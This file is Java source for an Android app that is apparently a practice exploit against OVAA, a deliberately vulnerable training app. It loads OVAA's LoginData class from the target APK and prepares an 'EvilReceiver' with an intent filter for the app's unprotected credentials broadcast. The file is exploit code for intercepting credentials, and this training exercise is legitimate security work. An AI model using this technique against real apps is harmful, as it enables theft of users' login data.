package com.exploit.broadcast;

import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import dalvik.system.DexFile;

public class MainActivity extends AppCompatActivity {
    EvilReceiver receiver;
    IntentFilter intentFilter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String packageName = "oversecured.ovaa";
        String className = "oversecured.ovaa.objects.LoginData";
        String apkPath = null;

        // in ovaa it creates new login data, so to create a new object we need the same LoginData class form the same package. so we are loading the dex file from the ovaa application using DexFile Class

        try {
            ApplicationInfo appInfo = getPackageManager().getApplicationInfo(packageName, 0);
            apkPath = appInfo.sourceDir;

            DexFile dexFile = new DexFile(apkPath);
            ClassLoader cl = getClassLoader();
            Class cli = dexFile.loadClass(className,cl);
            Object obj = cli.newInstance();

// DexFile is depricated PathClassLoader is an alternative provided by Android Developers, but its working as i expected.. FIXs are welcomed
//            ClassLoader cl = getClass().getClassLoader();
//            PathClassLoader pathClassLoader = new PathClassLoader(apkPath, cl);
//            DexClassLoader dexClassLoader = new DexClassLoader(apkPath, "/data/app/oversecured.ovaa-POOcOQ3uqL0pST4TztuD3w==/oat/x86/", null, cl);
//            Class<?> targetClass = dexClassLoader.loadClass("oversecured.ovaa.objects.LoginData");
//            Object obj = targetClass.newInstance();


        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.e("DEBUG",apkPath);
        receiver = new EvilReceiver();
       intentFilter = new IntentFilter("oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA");
    }
}